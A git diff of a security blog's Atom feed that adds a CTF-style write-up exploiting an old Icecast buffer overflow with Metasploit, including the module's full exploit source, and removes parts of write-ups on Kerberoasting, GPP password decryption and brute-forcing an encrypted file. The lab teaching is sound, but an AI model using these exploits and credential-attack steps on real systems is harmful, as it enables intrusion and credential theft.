@@ -1,4 +1,150 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-01-19T16:11:21+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - SecNotes</title><link href="http://localhost:4000/hack-the-box/secnotes/" rel="alternate" type="text/html" title="Hack The Box - SecNotes" /><published>2019-01-19T00:00:00+02:00</published><updated>2019-01-19T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/secnotes</id><content type="html" xml:base="http://localhost:4000/hack-the-box/secnotes/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-01-20T17:57:59+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Wizard Labs - Dummy</title><link href="http://localhost:4000/wizard-labs/dummy/" rel="alternate" type="text/html" title="Wizard Labs - Dummy" /><published>2019-01-20T00:00:00+02:00</published><updated>2019-01-20T00:00:00+02:00</updated><id>http://localhost:4000/wizard-labs/dummy</id><content type="html" xml:base="http://localhost:4000/wizard-labs/dummy/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys-this-is-my-write-up-about-dummy-from-wizard-labs-if-you-dont-know-them--they-are-a-new-penetration-testing-lab-they-have-16-boxes-so-far-and-dummy-is-their-first-box-to-retire-this-lab-is-nice-i-definitely-recommend-checking-it-out-dummy-is-a-windows-box-and-it-was-an-easy-one-difficulty-210-it-had-an-http-service-which-was-vulnerable-to-a-buffer-overflow--and-metasploit-had-a-module-for-it-so-this-box-can-be-done-easily-through-metasploit--i-will-show-that-then-we-will-take-a-look-at-the-exploit-and-how-its-happening-the-ip-of-the-box-is-101113-so-lets-jump-right-in&quot;&gt;Hey guys this is my write-up about Dummy from &lt;a href=&quot;https://labs.wizard-security.net/&quot;&gt;Wizard Labs&lt;/a&gt;. If you don’t know them , They are a new penetration testing lab, They have 16 boxes so far and Dummy is their first box to retire. This lab is nice I definitely recommend checking it out. Dummy is a windows box and it was an easy one (Difficulty: 2/10). It had an http service which was vulnerable to a buffer overflow , and metasploit had a module for it so this box can be done easily through metasploit . I will show that, then we will take a look at the exploit and how it’s happening. The ip of the box is 10.1.1.13 so let’s jump right in.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;h4 id=&quot;as-we-always-do-we-will-start-by-scanning-the-box-with-nmap--so-&quot;&gt;As we always do we will start by scanning the box with nmap , so :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC 10.1.1.13&lt;/code&gt;
+&lt;img src=&quot;/images/wizardlabs/dummy/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-see-a-lot-of-open-ports--most-of-the-http-ports-are-running-microsoft-httpapi-we-will-ignore-that-and-look-at-other-things-we-also-see-that-the-box-has-smb-which-is-an-interesting-thing-to-look-at-so-lets-try-smbmap&quot;&gt;We see a lot of open ports , most of the http ports are running Microsoft HTTPAPI, we will ignore that and look at other things. We also see that the box has smb which is an interesting thing to look at so let’s try smbmap&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -H 10.1.1.13&lt;/code&gt;
+&lt;img src=&quot;/images/wizardlabs/dummy/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-immediately-get-access-denied-so-smb-is-not-helpful-here&quot;&gt;And we immediately get Access Denied so smb is not helpful here.&lt;/h4&gt;
+&lt;h4 id=&quot;on-port-8000-theres-an-http-server-and-its-not-running-microsoft-httpapi--its-running-icecast-streaming-media-server-lets-check-that-port&quot;&gt;On port 8000 there’s an http server and it’s not running Microsoft HTTPAPI , it’s running &lt;a href=&quot;http://icecast.org/&quot;&gt;Icecast streaming media server&lt;/a&gt;. Let’s check that port&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;icecast&quot;&gt;Icecast&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;if-we-go-to-that-port-we-get-a-404-response-which-is-odd-we-can-try-bruteforcing-directories-with-dirbuster-but-that-wont-help-too-much&quot;&gt;If we go to that port we get a 404 response which is odd. We can try bruteforcing directories with dirbuster but that won’t help too much.&lt;/h4&gt;
+&lt;h4 id=&quot;by-searching-online-we-will-find-that-an-old-version-of-icecast-had-a-buffer-overflow-vulnerability-which-allowed-for-a-remote-command-execution-rce-and-we-also-find-a-metasploit-module--so-lets-open-metasploit-and-search-for-icecast-modules&quot;&gt;By searching online we will find that an old version of icecast had a buffer overflow vulnerability which allowed for a remote command execution (RCE). And we also find a &lt;a href=&quot;https://www.rapid7.com/db/modules/exploit/windows/http/icecast_header&quot;&gt;metasploit module&lt;/a&gt; . So let’s open metasploit and search for icecast modules.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;metasploit&quot;&gt;Metasploit&lt;/h3&gt;
+&lt;h4 id=&quot;by-doing-search-icecast-we-will-find-the-module--and-its-an-exploit-from-2004&quot;&gt;By doing &lt;code class=&quot;highlighter-rouge&quot;&gt;search icecast&lt;/code&gt; we will find the module , and it’s an exploit from 2004.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/4.png&quot; alt=&quot;&quot; /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;use windows/http/icecast_header&lt;/code&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;set LHOST 10.253.xx.xx&lt;/code&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;set RHOST 10.1.1.13&lt;/code&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit&lt;/code&gt;
+&lt;img src=&quot;/images/wizardlabs/dummy/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-got-a-meterpreter-session-we-can-drop-a-shell-by-typing-shell-then-if-we-type-whoami-we-will-find-that-we-are-already-administrator-so-no-need-for-privilege-escalation&quot;&gt;And we got a meterpreter session. we can drop a shell by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt; then if we type &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; we will find that we are already Administrator so no need for privilege escalation&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-we-can-grab-the-flags&quot;&gt;Then we can grab the flags&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;header-overwrite&quot;&gt;Header Overwrite&lt;/h3&gt;
+&lt;h4 id=&quot;so-now-we-did-the-box--but-lets-understand-the-exploit-basically-its-a-buffer-overflow-vulnerability-it-happens-because-that-version-of-icecast-only-accepted-a-maximum-of-32-headers-in-the-http-request--so-if-a-request-had-32-headers-this-caused-the-return-address-of-the-vulnerable-function-to-be-overwritten-with-a-pointer-to-the-begining-of-the-header-number-32-this-means-that-anything-we-add-as-the-32nd-header-will-be-executed&quot;&gt;So now we did the box , but let’s understand the exploit. basically it’s a buffer overflow vulnerability, it happens because that version of icecast only accepted a maximum of 32 headers in the HTTP request , so if a request had 32 headers this caused the return address of the vulnerable function to be overwritten with a pointer to the begining of the header number 32. this means that anything we add as the 32nd header will be executed&lt;/h4&gt;
+&lt;h4 id=&quot;so-if-we-make-a-request-with-31-headers-and-add-shellcode-as-the-32nd-header-we-can-get-a-reverse-shell-and-thats-what-metasploit-is-doing-but-if-we-look-at-the-source-of-the-module-&quot;&gt;So if we make a request with 31 headers and add shellcode as the 32nd header we can get a reverse shell and that’s what metasploit is doing. But if we look at the &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/icecast_header.rb&quot;&gt;source&lt;/a&gt; of the module :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule &amp;lt; Msf::Exploit::Remote
+  Rank = GreatRanking
+
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           =&amp;gt; 'Icecast Header Overwrite',
+      'Description'    =&amp;gt; %q{
+        This module exploits a buffer overflow in the header parsing of icecast
+        versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32
+        HTTP headers will cause a write one past the end of a pointer array. On
+        win32 this happens to overwrite the saved instruction pointer, and on
+        linux (depending on compiler, etc) this seems to generally overwrite
+        nothing crucial (read not exploitable).
+
+        This exploit uses ExitThread(), this will leave icecast thinking the
+        thread is still in use, and the thread counter won't be decremented.
+        This means for each time your payload exits, the counter will be left
+        incremented, and eventually the threadpool limit will be maxed. So you
+        can multihit, but only till you fill the threadpool.
+      },
+      'Author'         =&amp;gt; [ 'spoonm', 'Luigi Auriemma &amp;lt;aluigi[at]autistici.org&amp;gt;' ],
+      'License'        =&amp;gt; MSF_LICENSE,
+      'References'     =&amp;gt;
+        [
+          [ 'CVE', '2004-1561'],
+          [ 'OSVDB', '10406'],
+          [ 'BID', '11271'],
+          [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html'],
+        ],
+      'Privileged'     =&amp;gt; false,
+      'DefaultOptions' =&amp;gt;
+        {
+          'EXITFUNC' =&amp;gt; 'thread',
+        },
+      'Payload'        =&amp;gt;
+        {
+          'Space'    =&amp;gt; 2000,
+          'BadChars' =&amp;gt; &quot;\x0d\x0a\x00&quot;,
+          'DisableNops' =&amp;gt; true,
+          'StackAdjustment' =&amp;gt; -3500,
+        },
+      'Platform'       =&amp;gt; 'win',
+      'Targets'        =&amp;gt;
+        [
+          [ 'Automatic', { }],
+        ],
+      'DisclosureDate' =&amp;gt; 'Sep 28 2004',
+      'DefaultTarget' =&amp;gt; 0))
+
+    register_options(
+      [
+        Opt::RPORT(8000)
+      ])
+  end
+
+  # Interesting that ebp is pushed after the local variables, and the line array
+  # is right before the saved eip, so overrunning it just by 1 element overwrites
+  # eip, making an interesting exploit....
+  # .text:00414C00                 sub     esp, 94h
+  # .text:00414C06                 push    ebx
+  # .text:00414C07                 push    ebp
+  # .text:00414C08                 push    esi
+
+  def exploit
+    connect
+
+    # bounce bounce bouncey bounce.. (our chunk gets free'd, so do a little dance)
+    # jmp 12
+    evul = &quot;\xeb\x0c / HTTP/1.1 #{payload.encoded}\r\n&quot;
+    evul &amp;lt;&amp;lt; &quot;Accept: text/html\r\n&quot; * 31;
+
+    # jmp [esp+4]
+    evul &amp;lt;&amp;lt; &quot;\xff\x64\x24\x04\r\n&quot;
+    evul &amp;lt;&amp;lt; &quot;\r\n&quot;
+
+    sock.put(evul)
+
+    handler
+    disconnect
+  end
+end
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;theres-not-much-detail-because-its-based-on-metasploit-so-luckily-i-found-this-refrence-which-had-a-poc-c-code&quot;&gt;There’s not much detail because it’s based on metasploit so luckily I found this &lt;a href=&quot;https://securitytracker.com/id/1011439&quot;&gt;refrence&lt;/a&gt; which had a poc c code.&lt;/h4&gt;
+&lt;h4 id=&quot;by-looking-at-this-part-of-the-code-&quot;&gt;By looking at this part of the code :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-can-see-how-the-exploit-is-working-its-doing-a-get-request--adding-31-as-as-headers--then-the-32nd-header-is-the-shellcode&quot;&gt;We can see how the exploit is working. It’s doing a GET request , adding 31 “a”s as headers , then the 32nd header is the shellcode.&lt;/h4&gt;
+&lt;h4 id=&quot;if-you-want-to-know-more-about-bufferoverflows-check-out-my-other-articles&quot;&gt;If you want to know more about bufferOverFlows check out my &lt;a href=&quot;/categories&quot;&gt;other articles&lt;/a&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
+&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys this is my write-up about Dummy from Wizard Labs. If you don’t know them , They are a new penetration testing lab, They have 16 boxes so far and Dummy is their first box to retire. This lab is nice I definitely recommend checking it out. Dummy is a windows box and it was an easy one (Difficulty: 2/10). It had an http service which was vulnerable to a buffer overflow , and metasploit had a module for it so this box can be done easily through metasploit . I will show that, then we will take a look at the exploit and how it’s happening. The ip of the box is 10.1.1.13 so let’s jump right in. Nmap As we always do we will start by scanning the box with nmap , so : nmap -sV -sT -sC 10.1.1.13 We see a lot of open ports , most of the http ports are running Microsoft HTTPAPI, we will ignore that and look at other things. We also see that the box has smb which is an interesting thing to look at so let’s try smbmap smbmap -H 10.1.1.13 And we immediately get Access Denied so smb is not helpful here. On port 8000 there’s an http server and it’s not running Microsoft HTTPAPI , it’s running Icecast streaming media server. Let’s check that port Icecast If we go to that port we get a 404 response which is odd. We can try bruteforcing directories with dirbuster but that won’t help too much. By searching online we will find that an old version of icecast had a buffer overflow vulnerability which allowed for a remote command execution (RCE). And we also find a metasploit module . So let’s open metasploit and search for icecast modules. Metasploit By doing search icecast we will find the module , and it’s an exploit from 2004. use windows/http/icecast_header set LHOST 10.253.xx.xx set RHOST 10.1.1.13 exploit And we got a meterpreter session. we can drop a shell by typing shell then if we type whoami we will find that we are already Administrator so no need for privilege escalation Then we can grab the flags Header Overwrite So now we did the box , but let’s understand the exploit. basically it’s a buffer overflow vulnerability, it happens because that version of icecast only accepted a maximum of 32 headers in the HTTP request , so if a request had 32 headers this caused the return address of the vulnerable function to be overwritten with a pointer to the begining of the header number 32. this means that anything we add as the 32nd header will be executed So if we make a request with 31 headers and add shellcode as the 32nd header we can get a reverse shell and that’s what metasploit is doing. But if we look at the source of the module : ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &amp;lt; Msf::Exploit::Remote Rank = GreatRanking include Msf::Exploit::Remote::Tcp def initialize(info = {}) super(update_info(info, 'Name' =&amp;gt; 'Icecast Header Overwrite', 'Description' =&amp;gt; %q{ This module exploits a buffer overflow in the header parsing of icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32 HTTP headers will cause a write one past the end of a pointer array. On win32 this happens to overwrite the saved instruction pointer, and on linux (depending on compiler, etc) this seems to generally overwrite nothing crucial (read not exploitable). This exploit uses ExitThread(), this will leave icecast thinking the thread is still in use, and the thread counter won't be decremented. This means for each time your payload exits, the counter will be left incremented, and eventually the threadpool limit will be maxed. So you can multihit, but only till you fill the threadpool. }, 'Author' =&amp;gt; [ 'spoonm', 'Luigi Auriemma &amp;lt;aluigi[at]autistici.org&amp;gt;' ], 'License' =&amp;gt; MSF_LICENSE, 'References' =&amp;gt; [ [ 'CVE', '2004-1561'], [ 'OSVDB', '10406'], [ 'BID', '11271'], [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html'], ], 'Privileged' =&amp;gt; false, 'DefaultOptions' =&amp;gt; { 'EXITFUNC' =&amp;gt; 'thread', }, 'Payload' =&amp;gt; { 'Space' =&amp;gt; 2000, 'BadChars' =&amp;gt; &quot;\x0d\x0a\x00&quot;, 'DisableNops' =&amp;gt; true, 'StackAdjustment' =&amp;gt; -3500, }, 'Platform' =&amp;gt; 'win', 'Targets' =&amp;gt; [ [ 'Automatic', { }], ], 'DisclosureDate' =&amp;gt; 'Sep 28 2004', 'DefaultTarget' =&amp;gt; 0)) register_options( [ Opt::RPORT(8000) ]) end # Interesting that ebp is pushed after the local variables, and the line array # is right before the saved eip, so overrunning it just by 1 element overwrites # eip, making an interesting exploit.... # .text:00414C00 sub esp, 94h # .text:00414C06 push ebx # .text:00414C07 push ebp # .text:00414C08 push esi def exploit connect # bounce bounce bouncey bounce.. (our chunk gets free'd, so do a little dance) # jmp 12 evul = &quot;\xeb\x0c / HTTP/1.1 #{payload.encoded}\r\n&quot; evul &amp;lt;&amp;lt; &quot;Accept: text/html\r\n&quot; * 31; # jmp [esp+4] evul &amp;lt;&amp;lt; &quot;\xff\x64\x24\x04\r\n&quot; evul &amp;lt;&amp;lt; &quot;\r\n&quot; sock.put(evul) handler disconnect end end There’s not much detail because it’s based on metasploit so luckily I found this refrence which had a poc c code. By looking at this part of the code : We can see how the exploit is working. It’s doing a GET request , adding 31 “a”s as headers , then the 32nd header is the shellcode. If you want to know more about bufferOverFlows check out my other articles That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/wizardlabs/dummy/0.png" /></entry><entry><title type="html">Hack The Box - SecNotes</title><link href="http://localhost:4000/hack-the-box/secnotes/" rel="alternate" type="text/html" title="Hack The Box - SecNotes" /><published>2019-01-19T00:00:00+02:00</published><updated>2019-01-19T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/secnotes</id><content type="html" xml:base="http://localhost:4000/hack-the-box/secnotes/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-today-secnotes-retired-secnotes-was-a-very-nice-box-and-i-really-liked-that-it-mixed-between-windows-and-linux--and-thats-because-it-was-a-windows-box-and-it-had-windows-subsystem-for-linux-wsl-installedit-was-relatively-easy-its-ip-is-10101097-so-lets-jump-right-in&quot;&gt;Hey guys Today SecNotes retired. SecNotes was a very nice box and I really liked that it mixed between windows and linux , and that’s because it was a windows box and it had windows subsystem for linux (WSL) installed.It was relatively easy. It’s ip is 10.10.10.97 so let’s jump right in.&lt;/h4&gt;
@@ -1163,170 +1309,4 @@ int main(int argc, char **argv)
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---hawk&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/hawk/&quot;&gt;Hack The Box - Hawk&lt;/a&gt;&lt;/h4&gt;
 &lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---waldo&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/waldo/&quot;&gt;Hack The Box - Waldo&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Active was a great box and very realistic , Kinda easy if you’re familiar with windows active directory security. But if you’re not … then this box will teach you something. It’s a windows box and its ip is 10.10.10.100 so let’s jump right in . Nmap As Always we will start with nmap to scan for TCP ports and Services nmap -sV -sT 10.10.10.100 And we see many ports open but we will focus on the important ports only. Kerberos on 88 , netbios-ssn on 139 , ldap on 389 and 3268. SMB Enumeration Since we have netbios-ssn open on port 139 let’s run smbmap and see what we get. If you’re not on kali you can get smbmap from here smbmap -H 10.10.10.100 And we see that we can only access the share Replication anonymously smbclient //10.10.10.100/Replication After we access the share we will find a file called Groups.xml in \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\ By looking at the file we will find a username and an encrypted password. Decrypting GPP So if you don’t know what’s that cpassword … it’s called gpp (Group Policy Password) And I won’t talk about it in the write-up. If you’re interested here’s a great resource to read about it To decrypt it there’s a tool called gpp-decrypt. If you’re not on kali get it from here And we got the password GPPstillStandingStrong2k18 User Now we have the credentials SVC_TGS:GPPstillStandingStrong2k18 and we can own user smbclient //10.10.10.100/Users -U SVC_TGS Kerberoasting Now if we return to our nmap scan. We will see that we have kerberos running on port 88 and we have owned a user on the box so we will go for kerberoasting and if you don’t know what kerberoasting technique is you can read this great series about it Part 1 Part 2 Part 3 First we will add 10.10.10.100 to our /etc/hosts Then We will use GetUserSPNs.py from impacket to get administrator Kerberos ticket ./GetUserSPNs.py -request active.htb/SVC_TGS And we got the ticket in john format so it’s ready for cracking. We will just add the option -outputfile to save the ticket in a file and we’re ready to go. Cracking The Ticket We will use john to crack the ticket with rockyou.txt And one of the problems that I faced when I was trying to crack the ticket is that john wasn’t recognizing the format so make sure you’re using an updated version of both impacket and john because impacket also had problems with the hash format output. For me the problem was with john so I solved it by using jumbo version of john. ./john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt And we got the administrator password : Ticketmaster1968 Root Now we can easily get a root shell using psexec.py from impacket ./psexec.py administrator@active.htb That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Hawk Next Hack The Box write-up : Hack The Box - Waldo</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/active/0.png" /></entry><entry><title type="html">Hack The Box - Hawk</title><link href="http://localhost:4000/hack-the-box/hawk/" rel="alternate" type="text/html" title="Hack The Box - Hawk" /><published>2018-12-01T00:00:00+02:00</published><updated>2018-12-01T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/hawk</id><content type="html" xml:base="http://localhost:4000/hack-the-box/hawk/">&lt;hr /&gt;
-
-&lt;h4 id=&quot;hawk-has-retired-and-this-is-my-write-up-about-it&quot;&gt;Hawk has retired and this is my write-up about it.&lt;/h4&gt;
-&lt;h4 id=&quot;its-a-linux-box-and-its-ip-is-101010102-so-lets-jump-right-in-&quot;&gt;It’s a Linux box and it’s ip is 10.10.10.102 so let’s jump right in !&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;h4 id=&quot;starting-with-a-simple-nmap-scan-to-scan-tor-tcp--udp-ports-and-services&quot;&gt;Starting with a simple nmap scan to scan tor TCP , UDP ports and services.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sU 10.10.10.102&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/hawk/1.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-will-see-that-we-got-ftp-on-port-21--ssh-on-port-22--http-on-port-80-running-apache-server-and-http-on-port-8082-running-h2-database-http-console&quot;&gt;We will see that we got FTP on port 21 , SSH on port 22 , HTTP on port 80 running apache server and HTTP on port 8082 running H2 Database HTTP Console.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;ftp&quot;&gt;FTP&lt;/h3&gt;
-&lt;h4 id=&quot;since-theres-ftp-on-the-box-lets-check-if-we-can-do-anonymous-login&quot;&gt;Since there’s FTP on the box let’s check if we can do anonymous login.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-could-login-as-anonymous-and-we-got-a-file-called--drupaltxtenc&quot;&gt;We could login as anonymous and we got a file called : .drupal.txt.enc&lt;/h4&gt;
-&lt;h4 id=&quot;since-it-ends-with-enc-then-its-an-encrypted-file&quot;&gt;Since it ends with .enc then it’s an encrypted file.&lt;/h4&gt;
-&lt;h4 id=&quot;lets-run-file-command-against-it-to-get-more-information&quot;&gt;Let’s run file command against it to get more information.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file drupal.txt.enc
-drupal.txt.enc : openssl enc'd data with salted password , base64 encoded
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;so-base64-encoded--lets-decode-it&quot;&gt;So base64 encoded ? Let’s decode it.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;base64 -d drupal.txt.enc &amp;gt; drupal_decoded.txt.enc&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/hawk/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-the-file-is-ready-for-bruteforcing&quot;&gt;Now the file is ready for bruteforcing.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;decrypting-the-file&quot;&gt;Decrypting The File&lt;/h3&gt;
-&lt;h4 id=&quot;to-get-the-password-for-decryption-we-will-use-a-tool-called-bruteforce-salted-openssl-with-rockyou&quot;&gt;To get the password for decryption we will use a tool called bruteforce-salted-openssl with rockyou.&lt;/h4&gt;
-&lt;h4 id=&quot;its-already-installed-on-kali-but-if-youre-not-using-kali-you-can-get-it-from-here&quot;&gt;It’s already installed on kali but if you’re not using kali you can get it from &lt;a href=&quot;https://github.com/glv2/bruteforce-salted-openssl&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;now-theres-a-small-problem-we-need-to-specify-the-right-cipher-and-digest-to-be-able-to-crack-the-file-so-we-have-to-do-some-guessing&quot;&gt;Now there’s a small problem. We need to specify the right cipher and digest to be able to crack the file so we have to do some guessing.&lt;/h4&gt;
-&lt;h4 id=&quot;i-already-cracked-it-so-the-cipher-is-aes-256-cbc-and-the-digest-is-sha256&quot;&gt;I already cracked it so the cipher is AES-256-CBC and the digest is SHA256.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bruteforce-salted-openssl -t 50 -f /usr/share/wordlists/rockyou.txt -d sha256 drupal_decoded.txt.enc -1&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&quot;you-may-ask-yourself-why-i-didnt-specify-the-cipher-i-didnt-specify-it-because-the-tool-uses-aes-256-cbc-by-default&quot;&gt;You may ask yourself why I didn’t specify the cipher. I didn’t specify it because the tool uses AES-256-CBC by default.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;great--we-got-the-password--friends--lets-decrypt-the-file&quot;&gt;Great ! We got the password : friends . Let’s decrypt the file.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl aes-256-cbc -d -in drupal_decoded.txt.enc -out drupal.txt -k friends&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/hawk/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-we-have-a-username--daniel-and-a-password--pencilkeybaordscanner123&quot;&gt;Now we have a username : “daniel” and a password : PencilKeybaordScanner123&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;drupal&quot;&gt;Drupal&lt;/h3&gt;
-&lt;h4 id=&quot;we-see-in-the-message-that-the-password-is-for-a-portal-but-what-portal&quot;&gt;We see in the message that the password is for a portal. But what portal?&lt;/h4&gt;
-&lt;h4 id=&quot;lets-visit-the-website-on-port-80&quot;&gt;Let’s visit the website on port 80&lt;/h4&gt;
